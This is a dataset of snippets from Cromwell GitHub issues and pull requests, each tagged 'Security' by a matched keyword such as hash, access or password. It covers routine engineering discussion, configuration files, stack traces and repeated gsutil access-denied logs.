Security,"You're specifying both a tag and a hash, which you're right docker recognizes as a valid image (surprisingly I must say). We should fix Cromwell to validate that correctly. In the meantime if you use `quay.io/biocontainers/star@sha256:352f627075e436016ea2c38733b5c0096bb841e2fadcbbd3d4ae8daf03ccdf1b` it should work",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2254#issuecomment-300552698:35,hash,hash,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2254#issuecomment-300552698,2,"['hash', 'validat']","['hash', 'validate']"
Security,Zero is a perfectly valid size for a disk specification. At the moment it is disallowed because it's wired in through the same validations we use for things which don't make sense to be zero (e.g. CPU/memory). . Allow for zero sized disk,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4150:127,validat,validations,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4150,1,['validat'],['validations']
Security,[32] Fix performance issues with concurrent HTTP import validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3935:56,validat,validation,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3935,1,['validat'],['validation']
Security,[33] Fix performance issues with concurrent HTTP import validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3936:56,validat,validation,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3936,1,['validat'],['validation']
Security,[34 hotfix] Reduce hash cost of WdlSyntaxErrorFormatter (#3965),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3975:19,hash,hash,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3975,1,['hash'],['hash']
Security,[34] Fix performance issues with concurrent HTTP import validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3937:56,validat,validation,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3937,1,['validat'],['validation']
Security,[5170 PR Clone]: add validation of ARN in general and queue ARN [BA-5994],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5188:21,validat,validation,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5188,1,['validat'],['validation']
Security,[53 hotfix] Add error handling if Google returns null for file size or hash [BW-415],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6006:71,hash,hash,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6006,1,['hash'],['hash']
Security,[AWS] IOException: Could not read from ... Unable to execute HTTP request: Certificate for ...,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4321:75,Certificate,Certificate,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4321,1,['Certificate'],['Certificate']
Security,[Do not merge] Db restrict metadata access,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2428:36,access,access,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2428,1,['access'],['access']
Security,"[The ticket](https://broadworkbench.atlassian.net/browse/DDO-2190) has a ton more info and I talked with @aednichols about this--the short version is:; - Whatever is doing the HTTP request to Cromwell (Akka?) does not set the Host header ([per MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host)) if it has been customized beforehand; - We've accidentally been doing that by copying the _request's_ headers that came into CromIAM, which obviously include the Host header correlating to CromIAM itself; - Thus CromIAM sends requests to Cromwell with an incorrect Host header; - This hasn't mattered before because Cromwell's Layer 4 load balancer doesn't care and Cromwell's Apache proxy didn't actually need to do host-based routing because it just forwards everything to one app, Cromwell; - This suddenly matters a lot now because BEEs use an Nginx controller for ingress instead of a GCP Layer 4 load balancer, and _it_ needs to use host-based routing; - TL;DR: CromIAM is proxying to Cromwell wrong-ish and it very much does not work in BEEs. Solution: strip out the Host header just like CromIAM already does for Timeout-Access, and everything is happy. The impact to live environments should be zero because they clearly didn't care about the header before. If this fails anywhere, Argo sees the failure immediately like it did for BEEs, and it sees it in a way that any deployment or promotion would be halted because CromIAM would fail to come online from Argo's perspective.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6803:1143,Access,Access,1143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6803,1,['Access'],['Access']
Security,[WX-1410] Sanitize 4 byte UTF-8 characters before inserting into METADATA_ENTRY,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7414:10,Sanitiz,Sanitize,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7414,1,['Sanitiz'],['Sanitize']
Security,"[WX-968](https://broadworkbench.atlassian.net/browse/WX-968). - Gave Centaur the ability to authenticate with Azure Blob Storage and count files at a particular path. ; - Added file counting to our single, lonely, overworked, and under-appreciated azure integration test. . I'm new to Scala. Please feel free to be pedantic and nitpicky in your comments! . [WX-968]: https://broadworkbench.atlassian.net/browse/WX-968?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7104:92,authenticat,authenticate,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7104,1,['authenticat'],['authenticate']
Security,[develop] Add error handling if Google returns null for file size or hash [BW-415],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6007:69,hash,hash,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6007,1,['hash'],['hash']
Security,"[info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the cluster; providers { ; # For running jobs on an interactive node; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; root = ""cromwell-executions""; dockerRoot = ""/cromwell-executions""; runtime-attributes = """"""; String? docker; """"""; submit = ""/usr/bin/env bash ${script}"". # We're asking bash-within-singularity to run the script, but the script's location on the machine; # is different then the location its mo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:3561,password,password,3561,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['password'],['password']
Security,"\"",\n \""-Xms$(get_start_memory())m\"",\n \""-Xmx$(get_max_memory_from_runtime_memory(runtime.ram))m\"",\n \""-jar\"",\n \""/opt/linx/linx.jar\""\n ],\n \""inputs\"": [\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""threshold for # SVs in clusters to skip chaining routine (default = 2000)\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-chaining_sv_limit\""\n },\n \""default\"": 2000,\n \""id\"": \""#linx-1.10-beta.cwl/chaining_sv_limit\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Optional - Discover and annotate gene fusions\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-check_drivers\""\n },\n \""default\"": false,\n \""id\"": \""#linx-1.10-beta.cwl/check_drivers\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Optional - discover and annotate gene fusions\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-check_fusions\""\n },\n \""default\"": false,\n \""id\"": \""#linx-1.10-beta.cwl/check_fusions\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""[password]\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_pass\""\n },\n \""id\"": \""#linx-1.10-beta.cwl/db_pass\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""[db_url]\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_url\""\n },\n \""id\"": \""#linx-1.10-beta.cwl/db_url\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""[username]\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_user\""\n },\n \""id\"": \""#linx-1.10-beta.cwl/db_user\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""list of known fragile sites - specify Chromosome,PosStart,PosEnd - fragile_sites.csv\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-fragile_site_file\""\n },\n \""id\"": \""#linx-1.10-beta.cwl/fragile_site_file\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Distance upstream of gene to consider a breakend applicable\\n\"",\n \""default\"": 100000,\n \""id\"": \""#linx-1.10-beta.cwl/fusion_gene_distance\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:85997,password,password,85997,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['password'],['password']
Security,"] Running with database db.url = jdbc:hsqldb:mem:fad09ca5-b589-4874-b5de-bbd1dc0064fe;shutdown=false;hsqldb.tx=mvcc; [2019-07-10 14:32:53,36] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-07-10 14:32:53,38] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-07-10 14:32:53,46] [info] Running with database db.url = jdbc:hsqldb:mem:39174976-89f7-4769-a52c-7d5a4afc6cf4;shutdown=false;hsqldb.tx=mvcc; [2019-07-10 14:32:53,81] [info] Slf4jLogger started; [2019-07-10 14:32:54,07] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1cf43fa"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-07-10 14:32:54,11] [info] Metadata summary refreshing every 1 second.; [2019-07-10 14:32:54,12] [warn] 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); [2019-07-10 14:32:54,12] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-07-10 14:32:54,13] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-07-10 14:32:54,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-07-10 14:32:54,18] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-07-10 14:32:54,43] [info] SingleWorkflowRunnerActor: Version 42; [2019-07-10 14:32:54,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-07-10 14:32:54,48] [info] Unspecified type (Unspecified version) workflow 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5 submitted; [2019-07-10 14:32:54,50] [info] SingleWorkflowRunnerActor: Workflow submitted 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5; [2019-07-10 14:32:54,50] [info] 1 new workflows fetched by cromid-1cf43fa: 41d3eecf-c5a9-42e4-8a29-8b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:5240,hash,hash-lookup,5240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['hash'],['hash-lookup']
Security,]; > at slick.driver.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.run(JdbcActionComponent.scala:522) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponent$SimpleJdbcDriverAction.run(JdbcActionComponent.scala:32) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponent$SimpleJdbcDriverAction.run(JdbcActionComponent.scala:29) ~[cromwell-0.19.jar:0.19]; > at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell-0.19.jar:0.19]; > at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell-0.19.jar:0.19]; > at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_74]; > at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_74]; > at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_74]; > Caused by: org.hsqldb.HsqlException: integrity constraint violation: unique constraint or index violation; UK_SYM_WORKFLOW_EXECUTION_ID_SCOPE_NAME_ITERATION_IO table: SYMBOL; > at org.hsqldb.error.Error.error(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.Constraint.getException(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.index.IndexAVLMemory.insert(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.persist.RowStoreAVL.indexRow(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.TransactionManagerMVCC.addInsertAction(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.Session.addInsertAction(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.Table.insertSingleRow(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.StatementDML.insertRowSet(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.StatementInsert.getResult(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.StatementDMQL.execute(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.Session.executeCompiledStatement(Unknown Source) ~[cromwell-0.19,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/869:4119,integrity,integrity,4119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/869,1,['integrity'],['integrity']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3969,access,access,3969,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5223,access,access,5223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6477,access,access,6477,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7731,access,access,7731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8985,access,access,8985,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10239,access,access,10239,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 